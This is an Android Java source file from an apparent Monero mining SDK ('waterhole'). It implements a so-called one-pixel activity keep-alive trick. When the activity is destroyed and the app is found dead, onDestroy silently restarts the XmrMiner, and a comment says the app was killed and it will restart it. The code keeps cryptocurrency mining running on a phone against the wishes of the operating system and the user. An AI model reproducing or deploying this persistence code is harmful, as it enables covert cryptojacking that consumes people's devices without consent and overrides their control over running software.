package waterhole.miner.monero.keepappalive;

import static waterhole.miner.core.utils.LogUtils.error;
import static waterhole.miner.core.utils.LogUtils.info;

import android.app.Activity;
import android.os.Bundle;
import android.util.Log;
import android.view.Gravity;
import android.view.Window;
import android.view.WindowManager;

import waterhole.miner.core.StateObserver;
import waterhole.miner.monero.XmrMiner;
import waterhole.miner.monero.keepappalive.utils.ScreenManager;
import waterhole.miner.monero.keepappalive.utils.SystemUtils;

/**
 * 1像素Activity
 */
public class SinglePixelActivity extends Activity {

    private static final String TAG = "SinglePixelActivity";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Log.d(TAG, "onCreate--->启动1像素保活");
        Window mWindow = getWindow();
        mWindow.setGravity(Gravity.LEFT | Gravity.TOP);
        WindowManager.LayoutParams attrParams = mWindow.getAttributes();
        attrParams.x = 0;
        attrParams.y = 0;
        attrParams.height = 300;
        attrParams.width = 300;
        mWindow.setAttributes(attrParams);
        // 绑定SinglePixelActivity到ScreenManager
        ScreenManager.getScreenManagerInstance(this).setSingleActivity(this);
    }

    @Override
    protected void onDestroy() {
        Log.d(TAG, "onDestroy--->1像素保活被终止");
        if (!SystemUtils.isAPPALive(this)) {
            if (!XmrMiner.instance().isMining()) {
                XmrMiner.instance().init(getApplicationContext()).setStateObserver(new StateObserver() {

                    @Override
                    public void onConnectPoolBegin() {
                        info("onConnectPoolBegin");
                    }

                    @Override
                    public void onConnectPoolSuccess() {
                        info("onConnectPoolSuccess");
                    }

                    @Override
                    public void onConnectPoolFail(String error) {
                        error("onConnectPoolFail: " + error);
                    }

                    @Override
                    public void onPoolDisconnect(String error) {
                        error("onPoolDisconnect: " + error);
                    }

                    @Override
                    public void onMessageFromPool(String message) {
                        info("onMessageFromPool: " + message);
                    }

                    @Override
                    public void onMiningError(String error) {
                        error("onMiningError = " + error);
                    }

                    @Override
                    public void onMiningStatus(double speed) {
                        info("onMiningStatus speed = " + speed);
                    }
                }).startMine();
            }
            Log.i(TAG, "SinglePixelActivity---->APP被干掉了，我要重启它");
        }
        super.onDestroy();
    }
}
